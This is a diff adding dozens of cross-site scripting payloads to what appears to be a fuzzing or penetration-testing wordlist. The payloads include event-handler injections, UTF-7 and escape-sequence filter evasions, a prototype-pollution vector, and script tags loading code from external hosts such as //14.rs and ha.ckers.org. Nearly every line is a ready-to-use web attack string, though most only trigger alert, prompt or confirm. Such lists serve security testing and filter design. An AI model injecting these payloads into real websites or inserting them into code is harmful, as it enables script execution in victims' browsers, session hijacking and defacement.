@@ -1,4 +1,52 @@
- <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+"><svg onload=alert()>
+"><svg onload=alert()><b attr="
+" onmouseover=alert() "
+"onmouseover=alert()//
+"autofocus/onfocus="alert()
+'-alert()-'
+'-alert()//'
+'}alert(1);{'
+'}%0Aalert(1);%0A{'
+</script><svg onload=alert()>
+<svg onload=alert()>
+</tag><svg onload=alert()>
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+"autofocus/onfocus="prompt(1)
+<img src onerror=prompt(1) \
+<script>Set.constructor`prompt\x281\x29```</script>
+--!><img src onerror=prompt(1)
+//prompt.ml%2f@14.rs
+" type=image src onerror
+="prompt(1)
+javascript:prompt(1)#{"action":"z"}
+"><script>`#`;prompt(1)`#`</script>
+<ımg src onerror=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\160\162\157\155\160\164\50\61\51")()>
+"(prompt(1))in"
+eval((1558153217).toString(36).concat(String.fromCharCode(40).concat(1).concat(String.fromCharCode(41))))
+{"__proto__":{"source":"$'<svg/onload=prompt(1)//"},"source":"z*"}
+"><script>`#`;prompt(1)`#`</script>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
  <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
  <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 !--" /><script>alert('xss');</script>
